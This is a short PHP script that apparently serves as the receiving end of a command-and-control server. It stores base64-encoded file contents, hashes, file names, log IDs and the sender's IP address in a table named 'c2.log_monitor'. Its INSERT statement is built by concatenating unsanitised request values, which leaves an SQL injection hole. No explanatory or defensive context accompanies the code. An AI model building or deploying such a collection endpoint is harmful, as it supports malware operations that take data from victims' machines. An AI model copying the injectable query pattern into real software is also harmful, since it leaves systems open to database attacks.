
<?php

include 'conf.php';
include 'db.php';

?>


<?php


if( isset($_REQUEST["b64"]) && isset($_REQUEST["id_log"]) && isset($_REQUEST["hash"]) && isset($_REQUEST["file_name"]) ) {
	
	$b64 = $_REQUEST["b64"];  
	$id_log = $_REQUEST["id_log"];
	$ip = $_SERVER['REMOTE_ADDR'];
	$hash = $_REQUEST['hash'];
	$file_name = $_REQUEST['file_name'];
	
	$sql = "INSERT INTO c2.log_monitor (ip_address_source, b64, id_log, hash, file_name) VALUES ('" . $ip . "','" . $b64 . "','" . $id_log . "','" . $hash . "','" . $file_name . "')";
	$result = $conn->query($sql);

	if ($result) {
		echo "OK";
	} else {
		echo "ERR";
	}

}


 
?>

